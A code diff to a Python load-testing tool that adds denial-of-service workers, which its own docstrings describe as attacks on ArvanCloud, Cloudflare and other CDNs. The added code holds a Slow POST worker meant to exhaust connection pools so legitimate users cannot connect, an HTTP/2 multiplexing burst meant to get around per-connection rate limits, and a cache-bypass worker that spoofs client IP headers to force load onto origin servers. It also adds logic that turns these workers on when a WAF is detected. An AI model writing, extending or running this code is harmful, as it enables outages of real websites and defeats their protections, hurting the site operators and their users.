@@ -163,9 +163,11 @@ class LiveLog:
 
     def format_line(self, entry: dict) -> str:
         mode_colors = {'login': C.CY, 'page': C.B, 'resource': C.M,
-                       'slowloris': C.Y, 'api': C.G, 'viewstate': C.M, 'wp': C.CY}
+                       'slowloris': C.Y, 'api': C.G, 'viewstate': C.M, 'wp': C.CY,
+                       'slowpost': C.R, 'h2mux': C.M, 'cachedec': C.CY}
         mode_icons = {'login': 'AUTH', 'page': 'PAGE', 'resource': 'RES ',
-                      'slowloris': 'SLOW', 'api': 'API ', 'viewstate': 'VS  ', 'wp': 'WP  '}
+                      'slowloris': 'SLOW', 'api': 'API ', 'viewstate': 'VS  ', 'wp': 'WP  ',
+                      'slowpost': 'SPST', 'h2mux': 'H2MX', 'cachedec': 'CD  '}
         mc = mode_colors.get(entry['mode'], C.W)
         icon = mode_icons.get(entry['mode'], '????')
         status = entry['status']
@@ -307,6 +309,9 @@ class Stats:
     api_hits: int = 0
     viewstate_hits: int = 0
     wp_hits: int = 0
+    slowpost_hits: int = 0
+    h2mux_hits: int = 0
+    cachedec_hits: int = 0
     rts: deque = field(default_factory=lambda: deque(maxlen=50000))
     codes: Dict[int, int] = field(default_factory=dict)
     _recent: deque = field(default_factory=lambda: deque(maxlen=5000))
@@ -960,6 +965,229 @@ class VFTester:
                 consecutive_fails = 0
                 await asyncio.sleep(self.request_delay_ms / 1000)
 
+    # ─── ArvanCloud/CDN-Specific Attack Workers ───────────────────────────────
+
+    async def _worker_slow_post_read(self, session, delay=0):
+        """Slow POST/READ Attack — exhaust CDN connection pool.
+        
+        Sends POST request body byte-by-byte with long delays between chunks.
+        CDN has limited connection pool — each slow request ties up a connection.
+        When pool is exhausted, legitimate users can't connect.
+        Effective against ArvanCloud, Cloudflare, and similar CDNs.
+        """
+        if delay > 0: await asyncio.sleep(delay)
+        while not self._stop.is_set():
+            t = time.time()
+            try:
+                # Generate a large body that we'll send slowly
+                body_size = random.randint(50000, 500000)
+                headers = {**self._base_headers(),
+                          "Content-Type": "application/x-www-form-urlencoded",
+                          "Content-Length": str(body_size),
+                          "Connection": "keep-alive",
+                          "Origin": self.site_root, "Referer": self.url}
+                
+                # Create connection and send headers + body slowly
+                timeout = aiohttp.ClientTimeout(total=120, sock_read=60)
+                async with session.post(self.url, headers=headers, data=self._slow_body(body_size),
+                                       ssl=False, timeout=timeout,
+                                       allow_redirects=False) as resp:
+                    elapsed = time.time() - t
+                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                      mode="slowpost", hint=f"SlowPOST {resp.status} {elapsed:.1f}s",
+                                      url=self.url)
+                    await self.live_log.add("slowpost", resp.status, elapsed, None, self.url, result.hint)
+                    self.health_monitor.record(result)
+            except asyncio.TimeoutError:
+                elapsed = time.time() - t
+                result = HitResult(ok=True, code=None, rt=elapsed, mode="slowpost",
+                                  hint=f"SlowPOST timeout {elapsed:.1f}s", url=self.url)
+                await self.live_log.add("slowpost", None, elapsed, None, self.url, "timeout")
+                self.health_monitor.record(result)
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowpost",
+                                  err=type(e).__name__, url=self.url)
+                await self.live_log.add("slowpost", None, result.rt, type(e).__name__, self.url)
+                self.health_monitor.record(result)
+            self._record(result)
+
+    async def _slow_body(self, size: int):
+        """Async generator that yields body bytes slowly for Slow POST attack."""
+        chunk_size = random.randint(1, 5)  # 1-5 bytes at a time
+        sent = 0
+        filler = "A" * chunk_size
+        while sent < size and not self._stop.is_set():
+            remaining = size - sent
+            yield filler[:min(chunk_size, remaining)].encode()
+            sent += min(chunk_size, remaining)
+            # Random delay between chunks (0.1-2 seconds) to hold connection open
+            await asyncio.sleep(random.uniform(0.1, 2.0))
+
+    async def _worker_h2_multiplex(self, session, delay=0):
+        """HTTP/2 Multiplexing Attack — bypass CDN rate limiting.
+        
+        Uses httpx with HTTP/2 support to open a single TCP connection
+        and send many concurrent streams. Most CDNs rate-limit per TCP
+        connection or per IP, but HTTP/2 multiplexing allows hundreds
+        of concurrent requests on one connection, bypassing per-connection limits.
+        """
+        if delay > 0: await asyncio.sleep(delay)
+        if not HAS_HTTPX:
+            return
+        
+        while not self._stop.is_set():
+            t = time.time()
+            try:
+                # Use httpx for HTTP/2 support
+                async with httpx.AsyncClient(http2=True, verify=False,
+                                             timeout=httpx.Timeout(30.0)) as client:
+                    # Send multiple concurrent requests on single H2 connection
+                    num_streams = random.randint(10, 50)
+                    tasks = []
+                    for i in range(num_streams):
+                        if self._stop.is_set(): break
+                        url = self.url
+                        if self.enable_cache_bust:
+                            url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
+                        headers = {
+                            "User-Agent": random_ua(),
+                            "Accept": "text/html,*/*",
+                            "Accept-Language": "en-US,en;q=0.9",
+                            "Referer": self.url,
+                        }
+                        if i % 3 == 0:
+                            # Mix in some POST requests
+                            payload = json.dumps({"data": rand_user(), "t": random.randint(1, 99999)})
+                            headers["Content-Type"] = "application/json"
+                            tasks.append(client.post(url, headers=headers, content=payload))
+                        else:
+                            tasks.append(client.get(url, headers=headers))
+                    
+                    # Execute all streams concurrently
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
+                    elapsed = time.time() - t
+                    
+                    success_count = 0
+                    for r in results:
+                        if isinstance(r, httpx.Response):
+                            if r.status_code < 500:
+                                success_count += 1
+                    
+                    result = HitResult(ok=success_count > 0, code=200 if success_count > 0 else None,
+                                      rt=elapsed, mode="h2mux",
+                                      hint=f"H2 {success_count}/{num_streams} ok {elapsed:.1f}s",
+                                      url=self.url)
+                    await self.live_log.add("h2mux", 200 if success_count > 0 else None,
+                                           elapsed, None, self.url, result.hint)
+                    self.health_monitor.record(result)
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="h2mux",
+                                  err=type(e).__name__, url=self.url)
+                await self.live_log.add("h2mux", None, result.rt, type(e).__name__, self.url)
+                self.health_monitor.record(result)
+            self._record(result)
+
+    async def _worker_cache_deception(self, session, delay=0):
+        """Cache Deception/Bypass Attack — force CDN to hit origin every time.
+        
+        Sends requests with special headers that prevent CDN from caching
+        responses. Each request must be processed by the origin server,
+        multiplying the actual server load. Effective against ArvanCloud
+        and other CDNs with aggressive caching.
+        
+        Techniques used:
+        - Cache-Control headers requesting no-cache
+        - Vary header manipulation
+        - Accept-Encoding tricks
+        - URL path tricks with non-cachable extensions
+        - Query string manipulation
+        """
+        if delay > 0: await asyncio.sleep(delay)
+        consecutive_fails = 0
+        while not self._stop.is_set():
+            t = time.time()
+            try:
+                # Cache deception header combinations
+                cache_headers_list = [
+                    # Force origin bypass
+                    {**self._base_headers(),
+                     "Cache-Control": "no-cache, no-store, must-revalidate",
+                     "Pragma": "no-cache",
+                     "X-Arvan-Cache": "bypass",
+                     "X-Cache-Bypass": "1"},
+                    # Vary manipulation
+                    {**self._base_headers(),
+                     "Accept-Encoding": "identity",
+                     "Vary": "*",
+                     "X-Forwarded-Proto": "https"},
+                    # Range header (non-cacheable)
+                    {**self._base_headers(),
+                     "Range": "bytes=0-1",
+                     "If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT",
+                     "Cache-Control": "max-age=0"},
+                    # Cookie-based bypass
+                    {**self._base_headers(),
+                     "Cookie": f"nocache={rand_user()}; session={rand_user()}",
+                     "X-Requested-With": "XMLHttpRequest",
+                     "Accept": "application/json"},
+                    # Path trick with non-cacheable extension
+                    {**self._base_headers(),
+                     "Accept": "text/html,*/*",
+                     "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+                     "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"},
+                ]
+                
+                headers = random.choice(cache_headers_list)
+                
+                # URL tricks to defeat caching
+                url = self.url
+                trick = random.random()
+                if trick < 0.3:
+                    # Add fake extension to make CDN think it's non-cacheable
+                    url = f"{url}{'/' if not url.endswith('/') else ''}.json"
+                elif trick < 0.6:
+                    # Add random query params
+                    url = f"{url}{'&' if '?' in url else '?'}nocache={rand_user()}&t={int(time.time())}"
+                else:
+                    # Standard cache bust
+                    url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
+                
+                async with session.get(url, headers=headers,
+                                       ssl=False, allow_redirects=False) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t
+                    
+                    # Check if CDN cache was bypassed
+                    cache_status = resp.headers.get('X-Cache', resp.headers.get('CF-Cache-Status', ''))
+                    bypassed = any(x in cache_status.lower() for x in ['miss', 'bypass', 'dynamic', 'expired'])
+                    hint = f"CD {resp.status}"
+                    if bypassed:
+                        hint += " BYPASS"
+                    elif cache_status:
+                        hint += f" {cache_status}"
+                    
+                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                      mode="cachedec", hint=hint, url=url)
+                    await self.live_log.add("cachedec", resp.status, elapsed, None, url, hint)
+                    self.health_monitor.record(result)
+            except asyncio.TimeoutError:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cachedec",
+                                  err="Timeout", url=self.url)
+                await self.live_log.add("cachedec", None, result.rt, "Timeout", self.url)
+                self.health_monitor.record(result)
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cachedec",
+                                  err=type(e).__name__, url=self.url)
+                await self.live_log.add("cachedec", None, result.rt, type(e).__name__, self.url)
+                self.health_monitor.record(result)
+            self._record(result)
+            if not result.ok:
+                consecutive_fails += 1
+                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
+            else:
+                consecutive_fails = 0
+                await asyncio.sleep(self.request_delay_ms / 1000)
+
     def _record(self, r: HitResult):
         self.stats.total += 1
         self.stats.rts.append(r.rt)
@@ -978,6 +1206,9 @@ class VFTester:
         elif r.mode == "api": self.stats.api_hits += 1
         elif r.mode == "viewstate": self.stats.viewstate_hits += 1
         elif r.mode == "wp": self.stats.wp_hits += 1
+        elif r.mode == "slowpost": self.stats.slowpost_hits += 1
+        elif r.mode == "h2mux": self.stats.h2mux_hits += 1
+        elif r.mode == "cachedec": self.stats.cachedec_hits += 1
 
     async def _persistent_worker(self, session, vectors, pages, resources, delay=0):
         """Persistent worker wrapper — respawns inner workers when they die"""
@@ -1001,10 +1232,16 @@ class VFTester:
                     ssr_render_pct = weights.get("ssr_render_pct", 0.10)
                     viewstate_pct = 0
                     wp_pct = 0
+                    slowpost_pct = 0
+                    h2mux_pct = 0
+                    cachedec_pct = 0
                 else:
-                    login_pct = 0.40
-                    page_pct = 0.20
-                    resource_pct = 0.15
+                    # Check if CDN/WAF detected for ArvanCloud-specific attacks
+                    is_cdn_target = bool(self.detected_waf) or bool(self.attack.get("waf_strategy", {}).get("detected"))
+                    
+                    login_pct = 0.30
+                    page_pct = 0.15
+                    resource_pct = 0.10
                     slowloris_pct = 0.05
                     api_pct = 0.05 if self.has_api else 0
                     graphql_pct = 0
@@ -1012,49 +1249,78 @@ class VFTester:
                     ssr_render_pct = 0
                     viewstate_pct = 0.10 if self.is_aspnet else 0
                     wp_pct = 0.10 if self.is_wordpress else 0
+                    
+                    # CDN-specific attacks — activated when WAF/CDN detected
+                    if is_cdn_target:
+                        slowpost_pct = 0.10
+                        h2mux_pct = 0.05 if HAS_HTTPX else 0
+                        cachedec_pct = 0.10
+                        # Reduce other percentages to make room
+                        login_pct = 0.20
+                        page_pct = 0.10
+                    else:
+                        slowpost_pct = 0
+                        h2mux_pct = 0
+                        cachedec_pct = 0
 
-                total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + graphql_pct + spa_route_pct + ssr_render_pct + viewstate_pct + wp_pct
+                total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + graphql_pct + spa_route_pct + ssr_render_pct + viewstate_pct + wp_pct + slowpost_pct + h2mux_pct + cachedec_pct
                 if total == 0: total = 1
                 login_pct /= total; page_pct /= total; resource_pct /= total
                 slowloris_pct /= total; api_pct /= total; graphql_pct /= total
                 spa_route_pct /= total; ssr_render_pct /= total
                 viewstate_pct /= total; wp_pct /= total
+                slowpost_pct /= total; h2mux_pct /= total; cachedec_pct /= total
 
                 cumulative = 0
                 chosen = "page"
 
-                cumulative += api_pct
-                if r < cumulative: chosen = "api"
+                cumulative += slowpost_pct
+                if r < cumulative: chosen = "slowpost"
                 else:
-                    cumulative += graphql_pct
-                    if r < cumulative: chosen = "graphql"
+                    cumulative += h2mux_pct
+                    if r < cumulative: chosen = "h2mux"
                     else:
-                        cumulative += spa_route_pct
-                        if r < cumulative: chosen = "spa_route"
+                        cumulative += cachedec_pct
+                        if r < cumulative: chosen = "cachedec"
                         else:
-                            cumulative += ssr_render_pct
-                            if r < cumulative: chosen = "ssr_render"
+                            cumulative += api_pct
+                            if r < cumulative: chosen = "api"
                             else:
-                                cumulative += login_pct
-                                if r < cumulative: chosen = "login"
+                                cumulative += graphql_pct
+                                if r < cumulative: chosen = "graphql"
                                 else:
-                                    cumulative += page_pct
-                                    if r < cumulative: chosen = "page"
+                                    cumulative += spa_route_pct
+                                    if r < cumulative: chosen = "spa_route"
                                     else:
-                                        cumulative += resource_pct
-                                        if r < cumulative: chosen = "resource"
+                                        cumulative += ssr_render_pct
+                                        if r < cumulative: chosen = "ssr_render"
                                         else:
-                                            cumulative += slowloris_pct
-                                            if r < cumulative: chosen = "slowloris"
+                                            cumulative += login_pct
+                                            if r < cumulative: chosen = "login"
                                             else:
-                                                cumulative += viewstate_pct
-                                                if r < cumulative: chosen = "viewstate"
+                                                cumulative += page_pct
+                                                if r < cumulative: chosen = "page"
                                                 else:
-                                                    cumulative += wp_pct
-                                                    if r < cumulative: chosen = "wp"
+                                                    cumulative += resource_pct
+                                                    if r < cumulative: chosen = "resource"
+                                                    else:
+                                                        cumulative += slowloris_pct
+                                                        if r < cumulative: chosen = "slowloris"
+                                                        else:
+                                                            cumulative += viewstate_pct
+                                                            if r < cumulative: chosen = "viewstate"
+                                                            else:
+                                                                cumulative += wp_pct
+                                                                if r < cumulative: chosen = "wp"
 
                 # Execute a single request cycle
-                if chosen == "login":
+                if chosen == "slowpost":
+                    await self._single_slow_post_read(session)
+                elif chosen == "h2mux":
+                    await self._single_h2_multiplex()
+                elif chosen == "cachedec":
+                    await self._single_cache_deception(session)
+                elif chosen == "login":
                     await self._single_login(session)
                 elif chosen == "page":
                     await self._single_page(session, pages)
@@ -1282,6 +1548,122 @@ class VFTester:
             self.health_monitor.record(result)
         self._record(result)
 
+    async def _single_slow_post_read(self, session):
+        """Single Slow POST/READ request — exhaust CDN connection pool"""
+        t = time.time()
+        try:
+            body_size = random.randint(50000, 200000)
+            headers = {**self._base_headers(),
+                      "Content-Type": "application/x-www-form-urlencoded",
+                      "Content-Length": str(body_size),
+                      "Connection": "keep-alive",
+                      "Origin": self.site_root, "Referer": self.url}
+            timeout = aiohttp.ClientTimeout(total=60, sock_read=30)
+            async with session.post(self.url, headers=headers, data=self._slow_body(body_size),
+                                   ssl=False, timeout=timeout,
+                                   allow_redirects=False) as resp:
+                elapsed = time.time() - t
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="slowpost", hint=f"SPST {resp.status} {elapsed:.1f}s",
+                                  url=self.url)
+                await self.live_log.add("slowpost", resp.status, elapsed, None, self.url, result.hint)
+                self.health_monitor.record(result)
+        except asyncio.TimeoutError:
+            elapsed = time.time() - t
+            result = HitResult(ok=True, code=None, rt=elapsed, mode="slowpost",
+                              hint=f"SPST timeout {elapsed:.1f}s", url=self.url)
+            await self.live_log.add("slowpost", None, elapsed, None, self.url, "timeout")
+            self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slowpost",
+                              err=type(e).__name__, url=self.url)
+            await self.live_log.add("slowpost", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_h2_multiplex(self):
+        """Single HTTP/2 Multiplexing burst"""
+        if not HAS_HTTPX:
+            return
+        t = time.time()
+        try:
+            async with httpx.AsyncClient(http2=True, verify=False,
+                                         timeout=httpx.Timeout(15.0)) as client:
+                num_streams = random.randint(5, 20)
+                tasks = []
+                for i in range(num_streams):
+                    if self._stop.is_set(): break
+                    url = self.url
+                    if self.enable_cache_bust:
+                        url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
+                    headers = {"User-Agent": random_ua(), "Accept": "text/html,*/*",
+                               "Referer": self.url}
+                    tasks.append(client.get(url, headers=headers))
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                elapsed = time.time() - t
+                success_count = sum(1 for r in results if isinstance(r, httpx.Response) and r.status_code < 500)
+                result = HitResult(ok=success_count > 0, code=200 if success_count > 0 else None,
+                                  rt=elapsed, mode="h2mux",
+                                  hint=f"H2 {success_count}/{num_streams} {elapsed:.1f}s",
+                                  url=self.url)
+                await self.live_log.add("h2mux", 200 if success_count > 0 else None,
+                                       elapsed, None, self.url, result.hint)
+                self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="h2mux",
+                              err=type(e).__name__, url=self.url)
+            await self.live_log.add("h2mux", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_cache_deception(self, session):
+        """Single Cache Deception/Bypass request"""
+        t = time.time()
+        try:
+            cache_headers_list = [
+                {**self._base_headers(),
+                 "Cache-Control": "no-cache, no-store, must-revalidate",
+                 "Pragma": "no-cache", "X-Arvan-Cache": "bypass"},
+                {**self._base_headers(),
+                 "Accept-Encoding": "identity", "Vary": "*"},
+                {**self._base_headers(),
+                 "Range": "bytes=0-1", "Cache-Control": "max-age=0"},
+                {**self._base_headers(),
+                 "Cookie": f"nocache={rand_user()}", "X-Requested-With": "XMLHttpRequest"},
+            ]
+            headers = random.choice(cache_headers_list)
+            url = self.url
+            trick = random.random()
+            if trick < 0.3:
+                url = f"{url}{'/' if not url.endswith('/') else ''}.json"
+            elif trick < 0.6:
+                url = f"{url}{'&' if '?' in url else '?'}nocache={rand_user()}&t={int(time.time())}"
+            else:
+                url = f"{url}{'&' if '?' in url else '?'}{rand_cache_bust()}"
+            async with session.get(url, headers=headers, ssl=False, allow_redirects=False) as resp:
+                body = await resp.text()
+                elapsed = time.time() - t
+                cache_status = resp.headers.get('X-Cache', resp.headers.get('CF-Cache-Status', ''))
+                bypassed = any(x in cache_status.lower() for x in ['miss', 'bypass', 'dynamic', 'expired'])
+                hint = f"CD {resp.status}"
+                if bypassed: hint += " BYPASS"
+                elif cache_status: hint += f" {cache_status}"
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="cachedec", hint=hint, url=url)
+                await self.live_log.add("cachedec", resp.status, elapsed, None, url, hint)
+                self.health_monitor.record(result)
+        except asyncio.TimeoutError:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cachedec",
+                              err="Timeout", url=self.url)
+            await self.live_log.add("cachedec", None, result.rt, "Timeout", self.url)
+            self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cachedec",
+                              err=type(e).__name__, url=self.url)
+            await self.live_log.add("cachedec", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
     def _spawn_worker(self, session, all_tasks, vectors, pages, resources, delay=0):
         """Spawn a persistent worker that auto-respawns on failure"""
         t = asyncio.create_task(self._persistent_worker(session, vectors, pages, resources, delay=delay))
@@ -1334,6 +1716,9 @@ class VFTester:
         if self.stats.api_hits > 0: bd_parts.append(f"API:{self.stats.api_hits:,}")
         if self.stats.viewstate_hits > 0: bd_parts.append(f"VS:{self.stats.viewstate_hits:,}")
         if self.stats.wp_hits > 0: bd_parts.append(f"WP:{self.stats.wp_hits:,}")
+        if self.stats.slowpost_hits > 0: bd_parts.append(f"SPST:{self.stats.slowpost_hits:,}")
+        if self.stats.h2mux_hits > 0: bd_parts.append(f"H2:{self.stats.h2mux_hits:,}")
+        if self.stats.cachedec_hits > 0: bd_parts.append(f"CD:{self.stats.cachedec_hits:,}")
         line3 = f"  {C.DM}Breakdown: {' | '.join(bd_parts)}{C.RS}" if bd_parts else ""
 
         log_lines = self.live_log.get_lines()
@@ -1586,6 +1971,9 @@ def report(st: Stats, url: str, tester: VFTester):
         if st.api_hits:       print(f"  | API:        {st.api_hits:,}")
         if st.viewstate_hits: print(f"  | ViewState:  {st.viewstate_hits:,}")
         if st.wp_hits:        print(f"  | WordPress:  {st.wp_hits:,}")
+        if st.slowpost_hits:  print(f"  | SlowPOST:   {st.slowpost_hits:,}")
+        if st.h2mux_hits:     print(f"  | H2 Mux:     {st.h2mux_hits:,}")
+        if st.cachedec_hits:  print(f"  | CacheDec:   {st.cachedec_hits:,}")
     print(f"  +---------------------------------------------------+")
 
     # Crash Mode Summary
